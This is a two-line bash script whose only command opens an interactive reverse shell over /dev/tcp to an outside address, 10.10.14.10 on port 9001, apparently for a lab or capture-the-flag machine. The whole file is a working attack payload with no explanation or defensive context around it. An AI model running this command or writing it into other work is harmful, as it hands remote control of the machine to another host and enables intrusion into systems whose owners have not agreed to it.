#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/9001 0>&1
